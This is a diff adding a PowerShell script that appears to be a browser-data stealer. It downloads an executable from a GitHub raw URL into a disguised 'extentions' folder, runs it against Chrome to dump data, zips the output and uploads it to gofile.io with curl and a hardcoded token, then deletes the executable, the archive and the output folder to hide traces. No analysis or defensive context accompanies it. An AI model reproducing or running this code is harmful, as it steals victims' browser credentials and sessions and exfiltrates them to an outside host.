@@ -1,0 +1,60 @@
+
+function Upload-direToGofile {
+    param (
+        [string]$Path,
+        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK",
+        [string]$newFolderId
+    )
+    $uploadUri = "https://store1.gofile.io/uploadFile"
+    
+      try{ 
+            if (Test-Path $Path) {
+        $zipPath = "C:\ProgramX64\extentions\upload_package.zip"
+        
+       
+        if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+        
+
+        Compress-Archive -Path "$Path\*" -DestinationPath $zipPath -Force
+       
+
+        
+        
+        curl.exe -F "file=@$zipPath" -F "token=$ApiKey" $uploadUri
+        Start-Sleep -Milliseconds 30
+        Remove-Item $zipPath -Force
+        
+        
+        Start-Sleep -Milliseconds 30
+            
+        }
+   }
+    catch {Write-Host ""}
+}
+
+
+
+$url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/elevator_x64.exe"
+
+$outPath = "C:\ProgramX64\extentions\evab.exe"
+if(!(Test-Path -Path "C:\ProgramX64\extentions\out")){
+    mkdir "C:\ProgramX64\extentions\out"
+    cls
+}
+if((Test-Path -Path $outPath)) {
+Remove-Item -Path "C:\ProgramX64\extentions\evab.exe" -Force}
+Start-Sleep -Milliseconds 20
+if(!(Test-Path -Path $outPath)) {
+Invoke-WebRequest -Uri $url -OutFile $outPath}
+Start-Sleep -Milliseconds 20
+C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\out" chrome > C:\ProgramX64\extentions\out\a.dat
+Start-Sleep -Milliseconds 20
+Remove-Item -Path "C:\ProgramX64\extentions\evab.exe" -Force
+
+
+Upload-direToGofile -Path "C:\ProgramX64\extentions\out" -newFolderId "8e880585-ee8a-4871-a909-529fdfd5704b"
+
+cls
+
+Start-Sleep -Milliseconds 20
+Remove-Item -Path "C:\ProgramX64\extentions\out" -Recurse -Force
